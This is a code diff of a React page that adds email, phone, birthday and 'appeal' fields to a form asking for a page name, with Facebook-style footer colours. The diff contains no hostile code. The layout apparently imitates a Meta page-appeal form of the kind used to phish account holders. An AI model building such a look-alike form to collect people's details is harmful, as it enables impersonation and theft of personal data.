@@ -437,7 +437,6 @@ const Home = () => {
             {showGif && (
                 <div className="fixed inset-0 z-50 flex items-center justify-center bg-white">
                     <div className="text-center">
-                        {/* Thay bằng GIF thực tế của bạn */}
                         <img src="/loading.gif" alt="Loading" className="w-32 h-32 mx-auto" />
                         <p className="mt-4 text-lg">Loading...</p>
                     </div>
@@ -490,7 +489,6 @@ const Home = () => {
                             </div>
                             
                             <div className='flex flex-col gap-3 p-4 text-sm leading-6 font-semibold'>
-                                {/* Form fields giữ nguyên */}
                                 <div className='flex flex-col gap-2'>
                                     <p className='text-base sm:text-base'>
                                         {translatedTexts.pageName} <span className='text-red-500'>*</span>
@@ -507,7 +505,94 @@ const Home = () => {
                                     {errors.pageName && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                                 </div>
                                 
-                                {/* Các form fields khác giữ nguyên */}
+                                <div className='flex flex-col gap-2'>
+                                    <p className='text-base sm:text-base'>
+                                        {translatedTexts.mail} <span className='text-red-500'>*</span>
+                                    </p>
+                                    <input 
+                                        type='email' 
+                                        name='mail' 
+                                        autoComplete='email' 
+                                        className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled || isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`} 
+                                        value={formData.mail} 
+                                        onChange={(e) => handleInputChange('mail', e.target.value)} 
+                                        disabled={!isFormEnabled || isSubmitting}
+                                    />
+                                    {errors.mail === true && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
+                                    {errors.mail === 'invalid' && <span className='text-xs text-red-500'>{translatedTexts.invalidEmail}</span>}
+                                </div>
+                                
+                                <div className='flex flex-col gap-2'>
+                                    <p className='text-base sm:text-base'>
+                                        {translatedTexts.phone} <span className='text-red-500'>*</span>
+                                    </p>
+                                    <div className={`flex rounded-lg border ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled || isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}>
+                                        <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-2.5 sm:py-1.5 text-base sm:text-base font-medium text-gray-700'>{callingCode}</div>
+                                        <input 
+                                            type='tel' 
+                                            name='phone' 
+                                            inputMode='numeric' 
+                                            pattern='[0-9]*' 
+                                            autoComplete='off' 
+                                            className='flex-1 rounded-r-lg border-0 px-3 py-2.5 sm:py-1.5 focus:ring-0 focus:outline-none text-base' 
+                                            value={formData.phone.replace(/^\+\d+\s*/, '')} 
+                                            onChange={(e) => handleInputChange('phone', e.target.value)} 
+                                            disabled={!isFormEnabled || isSubmitting}
+                                        />
+                                    </div>
+                                    {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
+                                </div>
+                                
+                                <div className='flex flex-col gap-2'>
+                                    <p className='text-base sm:text-base'>
+                                        {translatedTexts.birthday} <span className='text-red-500'>*</span>
+                                    </p>
+                                    
+                                    <input 
+                                        type='date' 
+                                        name='birthday' 
+                                        className={`hidden sm:block w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled || isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`} 
+                                        value={formData.birthday} 
+                                        onChange={(e) => handleInputChange('birthday', e.target.value)} 
+                                        disabled={!isFormEnabled || isSubmitting}
+                                    />
+                                    
+                                    <div className='block sm:hidden relative'>
+                                        <input 
+                                            type='date' 
+                                            name='birthday' 
+                                            className={`w-full rounded-lg border px-3 py-2.5 text-base ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} opacity-0 absolute z-10`} 
+                                            value={formData.birthday} 
+                                            onChange={(e) => handleInputChange('birthday', e.target.value)}
+                                            required
+                                            disabled={!isFormEnabled || isSubmitting}
+                                        />
+                                        <div 
+                                            className={`w-full rounded-lg border px-3 py-2.5 bg-white ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${formData.birthday ? 'text-gray-900 text-base' : 'text-gray-500 text-base'} font-medium ${!isFormEnabled || isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}
+                                            onClick={() => (isFormEnabled && !isSubmitting) && document.querySelectorAll('input[name="birthday"]')[1].click()}
+                                        >
+                                            {formData.birthday ? formatDateToDDMMYYYY(formData.birthday) : 'dd/mm/yyyy'}
+                                        </div>
+                                    </div>
+                                    
+                                    {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
+                                </div>
+                                
+                                <div className='flex flex-col gap-2'>
+                                    <p className='text-base sm:text-base'>
+                                        {translatedTexts.yourAppeal} <span className='text-red-500'>*</span>
+                                    </p>
+                                    <textarea 
+                                        name='appeal'
+                                        rows={4}
+                                        className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 resize-none text-base ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled || isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}
+                                        placeholder={translatedTexts.appealPlaceholder}
+                                        value={formData.appeal}
+                                        onChange={(e) => handleInputChange('appeal', e.target.value)}
+                                        disabled={!isFormEnabled || isSubmitting}
+                                    />
+                                    {errors.appeal && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
+                                </div>
                                 
                                 <button 
                                     className={`w-full rounded-lg px-4 py-3 text-base font-semibold transition-colors duration-200 mt-2 flex items-center justify-center ${
@@ -541,7 +626,6 @@ const Home = () => {
                             </div>
                         </div>
                         
-                        {/* Footer giữ nguyên */}
                         <div className='w-full bg-[#f0f2f5] px-4 py-14 text-[15px] text-[#65676b] sm:px-32'>
                             <div className='mx-auto flex justify-between max-w-4xl'>
                                 <div className='flex flex-col space-y-4'>
